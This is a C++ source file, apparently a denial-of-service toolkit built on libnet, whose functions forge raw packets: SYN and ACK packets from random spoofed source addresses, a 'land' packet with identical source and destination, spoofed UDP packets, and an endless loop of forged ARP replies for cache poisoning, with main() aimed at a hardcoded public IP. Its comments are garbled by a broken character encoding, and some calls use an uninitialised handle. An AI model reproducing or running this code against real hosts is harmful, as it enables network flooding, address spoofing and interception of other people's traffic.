//#ifndef TCP_DOS_SUPPORT
//#define TCP_DOS_SUPPORT

#include <libnet.h>
#include <string.h>
#include <string>
//#include <stdlib>
#include <iostream>
#include   <time.h>
#include <sstream> 

using namespace std;

string create_random_IP()
{
	srand((unsigned)time(0));  
	stringstream stream[4];
	string tmp;
	string d;
	
	for(int i=0;i<4;i++)
	{
		int p = rand()%256;
		stream[i] << p;
		stream[i] >> d;
		tmp.append(d);
		if(i<3)
		{
			tmp+=".";
		}

	}
	cout<<tmp.data()<<endl;
	return tmp;
}


int construct_SYN_TCP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */
    
    char device[]= "ens33"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "125.216.249.125"; /* Ŀ��IP��ַ�ַ��� */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_TCP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */
    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ��ʼ��Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

#if 0
    /* ����TCP��ѡ��,ͨ���ڵ�һ��TCPͨ�ű���������MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* Դ�˿� */
                (uint16_t)dst_port,      /* Ŀ�Ķ˿� */
                8888,                    /* ���к� */
                8889,                    /* ȷ�Ϻ� */
                TH_SYN,                   /* Control flags */
                14600,                    /* ���ڳߴ� */
                0,                        /* У���,0Ϊ�Զ����� */
                0,                        /* ����ָ�� */
                LIBNET_TCP_H + payload_s, /* ���� */
                payload,                    /* �������� */
                payload_s,                /* �������ݳ��� */
                handle,                    /* libnet��� */
                0                        /* �½��� */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */ 
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/
    libnet_destroy(handle); /* �ͷž�� */
    return (0);

}

int construct_land_TCP(string dev,string dst_ip_s,int dst_port)
{

    string src_ip_s = dst_ip_s.data();

    libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */
    
    char device[]= "ens33"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "125.216.249.125"; /* Ŀ��IP��ַ�ַ��� */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_TCP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */
    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ��ʼ��Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

#if 0
    /* ����TCP��ѡ��,ͨ���ڵ�һ��TCPͨ�ű���������MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)dst_port,       /* Դ�˿� */
                (uint16_t)dst_port,      /* Ŀ�Ķ˿� */
                8888,                    /* ���к� */
                8889,                    /* ȷ�Ϻ� */
                TH_SYN,                   /* Control flags */
                14600,                    /* ���ڳߴ� */
                0,                        /* У���,0Ϊ�Զ����� */
                0,                        /* ����ָ�� */
                LIBNET_TCP_H + payload_s, /* ���� */
                payload,                    /* �������� */
                payload_s,                /* �������ݳ��� */
                handle,                    /* libnet��� */
                0                        /* �½��� */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */ 
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/
    libnet_destroy(handle); /* �ͷž�� */
    return (0);
}

int construct_ack_TCP(string dev,string dst_ip_s,int dst_port)
{
    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */
    
    char device[]= "ens33"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "125.216.249.125"; /* Ŀ��IP��ַ�ַ��� */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_TCP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */
    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ��ʼ��Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

#if 0
    /* ����TCP��ѡ��,ͨ���ڵ�һ��TCPͨ�ű���������MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* Դ�˿� */
                (uint16_t)dst_port,      /* Ŀ�Ķ˿� */
                8888,                    /* ���к� */
                8889,                    /* ȷ�Ϻ� */
                TH_ACK,                   /* Control flags */
                14600,                    /* ���ڳߴ� */
                0,                        /* У���,0Ϊ�Զ����� */
                0,                        /* ����ָ�� */
                LIBNET_TCP_H + payload_s, /* ���� */
                payload,                    /* �������� */
                payload_s,                /* �������ݳ��� */
                handle,                    /* libnet��� */
                0                        /* �½��� */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */ 
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/
    libnet_destroy(handle); /* �ͷž�� */
    return (0);
}

int ARP_dec_between_two_hosts(string dev,string dst_ip_s,string src_ip_s,int dst_port)
{
    //dst_ip_s���ŵ�Ŀ��IP
    //src_ip_sð�������IP
    libnet_t *handle;        /* Libnet��� */
    int packet_size;
    char *device = "eth0";    /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    u_int8_t *src_ip_str = "192.168.2.30";        /* ð�������IP */
    u_int8_t *dst_ip_str = "192.168.2.170";        /* ���ŵ�Ŀ��IP */
    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11};/* ��ٵ�ԴMAC */
    u_int8_t dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c};/* ���ŵ�Ŀ��MAC */
    u_int32_t dst_ip, src_ip;                /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE];        /* ������Ϣ */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* ��ʼ��Libnet,ע���һ��������TCP��ʼ����ͬ */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* ����arpЭ��� */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* Ӳ������,1��ʾ��̫��Ӳ����ַ */ 
                ETHERTYPE_IP,        /* 0x0800��ʾѯ��IP��ַ */ 
                6,                    /* Ӳ����ַ���� */ 
                4,                    /* IP��ַ���� */ 
                ARPOP_REPLY,        /* ������ʽ:ARP���� */ 
                src_mac,                /* source MAC addr */ 
                (u_int8_t *)&src_ip,    /* src proto addr */ 
                dst_mac,                /* dst MAC addr */ 
                (u_int8_t *)&dst_ip,    /* dst IP addr */ 
                NULL,                /* no payload */ 
                0,                    /* payload length */ 
                handle,                /* libnet tag */ 
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* ����һ����̫��Э���
    You should only use this function when 
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        dst_mac,            /* ��̫��Ŀ�ĵ�ַ */
        src_mac,            /* ��̫��Դ��ַ */
        ETHERTYPE_ARP,    /* ��̫���ϲ�Э�����ͣ���ʱΪARP���� */
        NULL,            /* ���أ�����Ϊ�� */ 
        0,                /* ���ش�С */
        handle,            /* Libnet��� */
        0                /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_proto_tag == -1)    {
        printf("build eth_header failure\n");
        return (-4);
    };

    while(1) {
        packet_size = libnet_write(handle);        /* ��ѭ������arp��ƭ�㲥 */
        usleep(1000);
    };

    libnet_destroy(handle);                /* �ͷž�� */

    return (0);
}

int construct_UDP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */

    char device[] = "eth0"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "192.168.2.170"; /* Ŀ��IP��ַ�ַ��� */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, udp_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_UDP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */

    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    /* ��ʼ��Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) {
        printf("libnet_init failure\n");
        return (-1);
    };

    strncpy((char*)payload, "testfwfewfwfeqwefqefqfe", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

    u_short rand_src_port = (u_short)rand()%6553;

    u_short u_dst_port = (u_short)dst_port;

    udp_tag = libnet_build_udp(
                rand_src_port, /* Դ�˿� */
                u_dst_port, /* Ŀ�Ķ˿� */
                LIBNET_UDP_H + payload_s, /* ���� */
                0, /* У���,0Ϊlibnet�Զ����� */
                payload, /* �������� */
                payload_s, /* �������ݳ��� */
                handle, /* libnet��� */
                0 /* �½��� */
    );
    if (udp_tag == -1) {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };

    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };

    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/

    libnet_destroy(handle); /* �ͷž�� */

    return (0);
}

int send(string dev,string dst_ip_s)
{
    string src_ip_s = create_random_IP();
    libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */
    char device[]= "ens33"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "125.216.249.125"; /* Ŀ��IP��ַ�ַ��� */
    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_TCP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */
    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ��ʼ��Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

#if 0
    /* ����TCP��ѡ��,ͨ���ڵ�һ��TCPͨ�ű���������MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    tcp_tag = libnet_build_tcp(
                30,                    /* Դ�˿� */
                800,                    /* Ŀ�Ķ˿� */
                8888,                    /* ���к� */
                8889,                    /* ȷ�Ϻ� */
                TH_SYN,                   /* Control flags */
                14600,                    /* ���ڳߴ� */
                0,                        /* У���,0Ϊ�Զ����� */
                0,                        /* ����ָ�� */
                LIBNET_TCP_H + payload_s, /* ���� */
                payload,                    /* �������� */
                payload_s,                /* �������ݳ��� */
                handle,                    /* libnet��� */
                0                        /* �½��� */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */ 
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/
    libnet_destroy(handle); /* �ͷž�� */
}

int main()
{
	string dev = "ens33";
	string dst_ip_s = "125.216.249.125";
	int port = 1234;
	construct_SYN_TCP(dev,dst_ip_s,port);
	//send(dev,dst_ip_s);
	construct_land_TCP(dev,dst_ip_s,port);
	construct_ack_TCP(dev,dst_ip_s,port);
	construct_UDP(dev,dst_ip_s,port);


libnet_t *handle; /* Libnet��� */
    int packet_size; /* ��������ݰ���С */
    char device[]= "ens33"; /* �豸����,Ҳ֧�ֵ�ʮ���Ƶ�IP��ַ,���Լ��ҵ�ƥ����豸 */
    char src_ip_str[] = "192.168.2.148"; /* ԴIP��ַ�ַ��� */
    char dst_ip_str[] = "125.216.249.125"; /* Ŀ��IP��ַ�ַ��� */
    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ԴMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ŀ��MAC */
    u_long dst_ip, src_ip; /* ��·���Ŀ��IP��ԴIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ������Ϣ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ����build��������ֵ */
    u_short proto = IPPROTO_TCP; /* �����Э�� */
    u_char payload[255] = {0}; /* �������ݵ����飬��ֵΪ�� */
    u_long payload_s = 0; /* �������ݵĳ��ȣ���ֵΪ0 */
    /* ��Ŀ��IP��ַ�ַ���ת���������� */
    dst_ip = libnet_name2addr4(handle, dst_ip_str, LIBNET_RESOLVE);
    /* ��ԴIP��ַ�ַ���ת���������� */
    src_ip = libnet_name2addr4(handle, src_ip_str, LIBNET_RESOLVE);
    /* ��ʼ��Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, device, error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "test", sizeof(payload)-1); /* ���츺�ص����� */
    payload_s = strlen((char*)payload); /* ���㸺�����ݵĳ��� */

#if 0
    /* ����TCP��ѡ��,ͨ���ڵ�һ��TCPͨ�ű���������MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    tcp_tag = libnet_build_tcp(
                30331,                    /* Դ�˿� */
                30331,                    /* Ŀ�Ķ˿� */
                8888,                    /* ���к� */
                8889,                    /* ȷ�Ϻ� */
                TH_SYN,                   /* Control flags */
                14600,                    /* ���ڳߴ� */
                0,                        /* У���,0Ϊ�Զ����� */
                0,                        /* ����ָ�� */
                LIBNET_TCP_H + payload_s, /* ���� */
                payload,                    /* �������� */
                payload_s,                /* �������ݳ��� */
                handle,                    /* libnet��� */
                0                        /* �½��� */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ����IPЭ��飬����ֵ�������ɵ�IPЭ����һ����� */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPЭ�����ܳ�,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,�������0~65535 */
        0, /* frag Ƭƫ�� */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,�������0~255 */
        proto, /* �ϲ�Э�� */
        0, /* У��ͣ���ʱΪ0����ʾ��Libnet�Զ����� */
        src_ip, /* ԴIP��ַ,������ */
        dst_ip, /* Ŀ��IP��ַ,������ */
        NULL, /* �������ݻ�ΪNULL */
        0, /* �������ݵĴ�С*/
        handle, /* Libnet��� */
        0 /* Э����ǿ��޸Ļ򴴽�,0��ʾ����һ���µ�*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ����һ����̫��Э���,ֻ������LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ��̫��Ŀ�ĵ�ַ */
        src_mac, /* ��̫��Դ��ַ */
        ETHERTYPE_IP, /* ��̫���ϲ�Э�����ͣ���ʱΪIP���� */
        NULL, /* ���أ�����Ϊ�� */ 
        0, /* ���ش�С */
        handle, /* Libnet��� */
        0 /* Э����ǣ�0��ʾ����һ���µ� */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* �����Ѿ���������ݰ�*/
    libnet_destroy(handle); /* �ͷž�� */
	return 0;
}

//#endif